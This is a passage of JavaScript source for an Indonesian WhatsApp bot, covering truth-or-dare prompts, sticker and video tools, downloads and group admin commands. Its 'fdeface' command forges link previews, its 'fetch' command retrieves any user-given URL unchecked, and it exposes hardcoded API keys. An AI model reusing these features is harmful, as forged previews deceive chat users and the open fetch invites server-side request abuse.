					const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButMessage(from, ttrth, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", [
          {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
         {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`,
            },
            type: 1,
          },

 ]);
					
					break
		case "dare":
		  if (!isRegistered) return reply(mess.ban)
					// Fix Case By Yogi/Hans⛔
                 
					const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					sya = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButMessage(from, der, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", [
					  {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`,
            },
            type: 1,
          },

 ]);
					break
        case 'get':
case 'fetch':
            if(!c) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
      case "slow":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await KonX.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            KonX.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
      case "reverse":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await KonX.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          KonX.sendMessage(from, buffer453, video, {
            mimetype: "video/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
  case "tod":
  if (!isRegistered) return reply(mess.ban)
					 var arasyagans =` ${pushname} mau yg truth or dare?\n\npilih tombol di bawah `
					sendButImage(from, arasyagans, "Case By @iamghosky_", thumb, [
          {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`
            },
            type: 1,
          },
 ]);
 break
      case "anime":
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                KonX.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case 'kalkulator':
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				
				case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
	case 'halloween':
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'bilangangka':
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'pantun':
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
buttons = [{buttonId: `${prefix}pantun`,buttonText:{displayText: 'Next ➡️'},type:1},{buttonId: `${prefix}command`,buttonText:{displayText: 'Back Menu🌹'},type:1}]
              buttonsMessage = { contentText: `${kata}`, footerText: `Created By ${fakeyoi}🌹`, buttons: buttons, headerType: 1 }
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:mek})
              KonX.relayWAMessage(prep)
			break
			
  	case 'artinama':	
  	  reply(mess.wait)
  rival = await fetchJson(`https://bx-hunter.herokuapp.com/api/artinama?nama=${args[0]}&apikey=${HunterApi}`, {method:'get'})
  slur = rival.result
   reply(slur)
   break   
               case 'artimimpi':
               if (!isRegistered) return reply (mess.banned)
               if (args.length == 0) return reply(`Example: ${prefix + command} menikah`)
               anu = await fetchJson(`https://melcanz.com/artimimpi?mimpi=${args.join(' ')}&apikey=3Vzo8CSS`)
               apri = anu.result
               sendButMessage(from, apri, `_*ASIAP BANG*_`, [
          {
            buttonId: `${prefix}siap`,
            buttonText: {
              displayText: `OKE`,
            },
            type: 1,
          },]);
        break;
case 'waifu':
          case 'loli':
          case 'husbu':
          case 'milf':
          case 'cosplay':
          case 'wallml':
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]
              imageMsg = ( await KonX.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Klik Button untuk lanjut ya bwanh', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              KonX.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
              case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await KonX.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await KonX.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break            
   case'liriklagu':
     reply(mess.wait)
  apa = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${args[0]}&apikey=${HunterApi}`,{method:'get'})
  apa2 = apa.result
  reply(apa2)
  break
case 'attp':
              if (args.length == 0) return reply(`Example: ${prefix + command} KonX`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              KonX.sendMessage(from, buffer, sticker, { quoted: freply })
              break
				case 'resepmasakan':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					KonX.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
					if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					KonX.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					case 'infogempa':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					KonX.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break
					case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await KonX.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					KonX.sendMessage(from, yeh, text, { quoted: mek })
					break
					case "#dc":
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await KonX.groupMetadata(anu)
				KonX.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
				  case 'list':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*${prefix}* @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
	   case 'infogrup':
       case 'infogrouup':
       case 'grupinfo':
       case 'groupinfo':
       case 'infogc':
              if (!isGroup) return reply(mess.only.group)
              try {
              var pic = await KonX.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Descripti:* \n${groupMetadata.desc}`
              KonX.sendMessage(from, await getBuffer(pic), image, {quoted: freply, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              break
       case 'tagall':
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break 
      case "kontak":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        KonX.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
        case 'antibug':
       if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          if (args[0] === '1') {
          if (bugc === true) return
          bugc = true
          reply('Berhasil menyalakan antibug')
          } else if (args[0] === '0') {
          if (bugc === false) return
          bugc = false
          reply('Berhasil mematikan antibug')
          } else {
          reply('Pilih 1 atau 0')
          }
          break     
case 'antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antidel)return reply('Sudah diaktifkan sebelumnya!')
antidel = true
reply(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if(!antidel)return reply('Sudah di NonAktifkan sebelumnya!')
antidel = false
reply(`Succes mematikan antidelete`)
} else {
reply(`Pilih on atau off`)
}
break
      case 'welcome':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(welcom)return reply('Sudah diaktifkan sebelumnya!')
welcom = true
reply(`Succes mengaktifkan welcome`)
} else if (args[0] === "off") {
if(!welcom)return reply('Sudah di NonAktifkan sebelumnya!')
welcom = false
reply(`Succes mematikan welcome`)
} else {
reply(`Pilih on atau off`)
}
break          
      case "take":
      case "colong":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        if (!isQuotedSticker) return reply("Stiker aja om");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await KonX.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `BY YT`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `Naufal`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, KonX, mek, from);
        break;
      case "stikerwm":
      case "stickerwm":
      case "swm":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await KonX.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              KonX.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                KonX.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await KonX.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              KonX.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                KonX.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;

      case "fdeface":
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await KonX.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await KonX.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        KonX.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        fakeyt(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        fakeyt(`「 *SELF-MODE* 」`);
        break;
      case "hidetag":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(" ");
        var group = await KonX.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        KonX.sendMessage(from, optionshidetag, text);
        break;   
case 'play':
  if (args.length < 1)return reply(mess.prem)
              if (!q) return reply('Linknya?')
              buttons = [{buttonId: `${prefix}video ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}audio ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(fs.readFileSync(`./stik/logoyt.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/logoyt.jpg`)})).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`Silahkan Pilih Media Yg Akan Di Download kak`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              KonX.relayWAMessage(prep)
              break
case 'audio':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                            const playy = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
                            const mulaikah = playy.data.result[0].url
                            try {
                                reply(mess.wait)
                                yta(mulaikah)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
                                    sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}}).catch(() => reply(mess.error.api))
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
      case 'video':   
        if (args.length < 1)return reply(mess.prem)
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... ')
				acaa = args.join(" ")
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/yt/playmp4?query=${acaa}&apikey=Ikyy69`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				KonX.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:mek, caption: 'Nih Gan'})
					break      
      case "sticker":
      case "stiker":
      case "sg":
      case "s":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await KonX.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              KonX.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await KonX.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              KonX.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
        case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await KonX.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
